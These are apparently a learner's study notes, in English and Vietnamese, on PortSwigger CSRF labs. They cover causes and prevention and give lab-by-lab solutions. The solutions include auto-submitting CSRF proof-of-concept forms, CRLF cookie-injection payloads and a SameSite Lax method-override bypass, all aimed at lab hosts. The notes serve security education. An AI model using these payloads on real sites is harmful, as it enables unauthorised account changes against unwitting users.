# [CSRF](https://portswigger.net/web-security/csrf)

Causes and Conditions: 

- Applications rely solely on session cookies for authentication without verifying request origin
- Absence of anti-CSRF tokens or SameSite cookie attributes.
- 3 conditions: 
  - A relevant action: email change,...
  - Cookie-based session handling
  - No unpredictable request parameters: request to change password require the old one,...


Impact: 

- Unauthorized actions performed on behalf of authenticated users

- Potential account compromise, fund transfers, or data tampering

Categories: 

- 

Prevention:  

- Use SameSite=strict or SameSite=lax cookie attributes.
- Implement anti-CSRF tokens in state-changing requests.
- Verify the origin or Referer headers server-side.

XSS vs CSRF:

- 

Common Payloads through Labs Completion:

## - Apprentice

### [Lab 1: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

- Log in using the given cred:

![image-20250524092124689](./image/image-20250524092124689.png)

- Using function auto generate CSRF POC of Burpsuite pro: 

![image-20250524093858189](./image/image-20250524093858189.png)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa9008403583938804017ea00ce00dd.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="n33r9&#64;hacker4&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

- Submit it to the exploit server: tab `body` ` and get the result of email change: 

![image-20250524094141022](./image/image-20250524094141022.png)

=> Change email successfully!

## - Practitioner

### [Lab 1: CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

![image-20250524102252461](./image/image-20250524102252461.png)

- Send request to repeater and change csrf parameter and observe the result: 

![image-20250524102543927](./image/image-20250524102543927.png)

- Change request method: GET

`GET /my-account/change-email?email=n33r9%40hacker3.com&csrf=n33r9`

![image-20250524105750805](./image/image-20250524105750805.png)

=> HTTP/2 302 Found

- Gen new CSRF payload:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0c00d80307391e8053354f00840064.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="n33r9&#64;hacker3&#46;com" />
      <input type="hidden" name="csrf" value="n33r9" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

 ![image-20250524110119226](./image/image-20250524110119226.png)



### [Lab 2: CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

Lab des: 

**Chức năng đổi email** không thực sự kiểm tra giá trị của token CSRF – chỉ cần token tồn tại trong request là hợp lệ.

=> Cho phép tấn công CSRF bằng cách gửi một form giả tới `/my-account/change-email` kèm theo một token bất kỳ.

steps:

- Thay đổi email:

![image-20250602102057281](./image/image-20250602102057281.png) 



- Thay đổi gái trị csrf :

![image-20250602102202162](./image/image-20250602102202162.png) 



- XOá hẳn csrf

![image-20250602102249186](./image/image-20250602102249186.png) 

- gen csrf poc sử dụng burpsuite

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0afe00de03a17bee805f2bc0001500a7.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="thao&#46;khong&#64;lq&#46;co" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![image-20250602102444822](./image/image-20250602102444822.png)



### [Lab 3: CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

Lab des:

Ứng dụng có chức năng đổi email dùng CSRF token.

Tuy nhiên, CSRF token không gắn chặt với session ⇒ server không kiểm tra token có hợp lệ với người dùng hay không, chỉ cần *token hợp lệ về mặt cú pháp* là được.

=> Lấy token từ chính tài khoản của mình => tấn công tài khoản khác (carlos)

steps: 

- login as `wiener` => csrf token: 

  ```js
  email=thao.khong%40lqd1.vn&csrf=59GRiBb3KQKFxgenN5zZn3fbb13IOWJf
  ```

- login as `carlos` => csrf token ở tab ẩn danh:

![image-20250602133633834](./image/image-20250602133633834.png)

```
bawV7IZTxbuEr8pzUH0LXrcQI8a6P0fG
```

- Đổi csrf token từ carlos sang wiener:

  ```
  email=wienr2%40test1.com&csrf=bawV7IZTxbuEr8pzUH0LXrcQI8a6P0fG
  ```

  ![image-20250602133805480](./image/image-20250602133805480.png)

302 found => csrf không gắn với session

- craft payload:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5b007d04bde8c180a958ae00db00ee.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wienr2&#64;testsuccess&#46;com" />
      <input type="hidden" name="csrf" value="59GRiBb3KQKFxgenN5zZn3fbb13IOWJf" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![image-20250602134412795](./image/image-20250602134412795.png)

### [Lab 4: CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

lab des: 

Token csrf không ràng buộc cùng với session cookie.

`session` – cookie quản lý **phiên đăng nhập**.

`csrfKey` – cookie dùng để **tạo CSRF token**.

![image-20250602204104741](./image/image-20250602204104741.png)

Thay đổi Cookie `session` → bị **đăng xuất** → là cookie xác thực phiên.

Thay đổi Cookie `csrfKey` → **token bị từ chối**, **nhưng không bị đăng xuất**.

Đăng nhập ẩn danh vào tài khoản thứ 2, mượn csrfKey và csrf của tài khoản 2, thay vào tài khoản 1, và thực hiện change email => request được chấp nhận

- chức năng search: ![image-20250602211903654](./image/image-20250602211903654.png)

  => search term được reflected trong trường Set-cookie

steps:

- Craft payload: bỏ auto submit, chèn thêm dòng này: `<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`
- `test\r\nSet-Cookie: csrfKey=YjDqh0pgDKAlu5xMpug8xjaRBw3hX3OM; SameSite=None`

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/');</script>
    <form action="https://0a5100e704c97ef381c0fd29005a0070.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener&#64;test&#46;com&#46;vn" />
      <input type="hidden" name="csrf" value="wRIe5w5zqS456jIGu5ix3mDnKtTFnmfi" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a5100e704c97ef381c0fd29005a0070.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YjDqh0pgDKAlu5xMpug8xjaRBw3hX3OM%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```

![image-20250602212445484](./image/image-20250602212445484.png)



### [Lab 5: CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

Lab des:

Ứng dụng cố gắng ngăn chặn CSRF bằng cách dùng kỹ thuật **"double submit" cookie**, nhưng cách triển khai không an toàn.

Server gửi một **cookie chứa CSRF token** (ví dụ: `csrf=abc123`).

Form gửi lên sẽ có một **input hidden trùng giá trị** với CSRF token trong cookie.

 Trên server, so sánh giá trị trong cookie và trong input. Nếu trùng thì chấp nhận.

![image-20250602234552349](./image/image-20250602234552349.png)

![image-20250602234806375](./image/image-20250602234806375.png)

=> search term được reflect trong trường `Set-cookie` + không có `csrf` bảo vệ => có thể dùng để chèn cookie vào trình duyệt của nạn nhân

`/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`

Steps:

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/');</script>
    <form action="https://0a1b00a504484c4d8241bf8d00800087.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="winer&#46;khong&#64;lqd&#46;xn" />
      <input type="hidden" name="csrf" value="3mPPWvLMixEiC5e0RXEO4FMnZ2tkNDl3" />
      <input type="submit" value="Submit request" />
    </form>
      <img src="https://0a1b00a504484c4d8241bf8d00800087.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=3mPPWvLMixEiC5e0RXEO4FMnZ2tkNDl3%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>

```

### ![image-20250602235825589](./image/image-20250602235825589.png)



### [Lab 6:  SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

Lab des: 

![image-20250603000940958](./image/image-20250603000940958.png)

=> khoogn sử dụng csrf token => cookie được gửi thành công từ domain khác, attacker có thể khai thác điều này để thay đổi email của người dùng.

![image-20250603001253974](./image/image-20250603001253974.png)

Không chỉ định mức độ và kiểu Samesite restrict => mức độ Lax mặc định

Thuộc tính `SameSite` trong cookie kiểm soát **liệu cookie có được gửi kèm trong các request từ domain khác hay không**.

- `Strict`: Không bao giờ gửi cookie trong cross-site request.
- `Lax`: Gửi cookie **trong GET request** nếu là điều hướng cấp cao nhất (ví dụ người dùng bấm link).
- `None`: Cho phép gửi cookie trong mọi cross-site request (phải đi kèm `Secure`).

Vì website **không chỉ định** `SameSite`, nên trình duyệt sẽ dùng **giá trị mặc định là `Lax`**. Tức là:

- Các **GET request cross-site** có thể gửi kèm cookie (ví dụ từ một trang giả mạo).
- Nếu attacker tạo một link chứa payload và dụ người dùng bấm vào, cookie sẽ được gửi → CSRF attack có thể thực hiện.



Steps: 

- Bypass the Samesite:

  CHuyển method của req change email thành GET: 

![image-20250603003155103](./image/image-20250603003155103.png)

Bypass: 

![image-20250603003312679](./image/image-20250603003312679.png)

![image-20250603003351998](./image/image-20250603003351998.png)

=> server đã chấp nhận request

![image-20250603003427552](./image/image-20250603003427552.png)

- Craft payload: 

```html
<script>
    document.location = "https://0ac30030038a360d80e5038c00590030.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```

![image-20250603003741925](./image/image-20250603003741925.png)



### [Lab 7: SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

Lab des: 



Steps: 
